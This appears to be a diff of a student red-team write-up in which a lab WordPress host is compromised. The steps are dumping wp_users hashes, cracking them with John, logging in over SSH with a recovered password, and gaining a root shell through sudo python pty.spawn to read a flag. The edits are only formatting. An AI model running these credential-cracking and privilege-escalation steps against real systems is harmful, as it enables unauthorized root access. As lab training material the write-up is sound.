@@ -91,20 +91,20 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
               - Use of weak salted hashes and Python root escalation Privileges.  
               - Still using michaels credentials, gather the password hashes to crack.  
               - The usernames and password hashes were copied to the kali server in a file (wp_hashes.txt), and cracked with John.  
-              - select * from wp_users;
+              - select * from wp_users;    
               - john wp_hashes.text
 <img src="https://github.com/mhighbe-20/Cybersecurity_Final_Project/blob/main/Images/RedTeam/Steven_Pink84.png?raw=true" style="height: 400px; width:600px;"/>
 
-              - use steven credentials to ssh to target1 and escalate privileges to find flag4.    
-               - ssh steven@192.168.1.110
-               - pw:pink84   
-               - sudo -l  
-               - sudo python -c ‘import pty;pty.spawn(“/bin/bash”)’   
+              - use Steven credentials to ssh to target1 and escalate privileges to find flag4.  
+              - ssh steven@192.168.1.110
+              - pw: pink84
+              - sudo -l
+              - sudo python -c ‘import pty;pty.spawn(“/bin/bash”)’   
 
 <img src="https://github.com/mhighbe-20/Cybersecurity_Final_Project/blob/main/Images/RedTeam/sudo-stephen.png?raw=true"/>
 
-               - cd /root
+              - cd /root
               - ls
-              - cat flag4.txt     
+              - cat flag4.txt      
 
 <img src="https://github.com/mhighbe-20/Cybersecurity_Final_Project/blob/main/Images/RedTeam/Flag-4.png?raw=true"/>
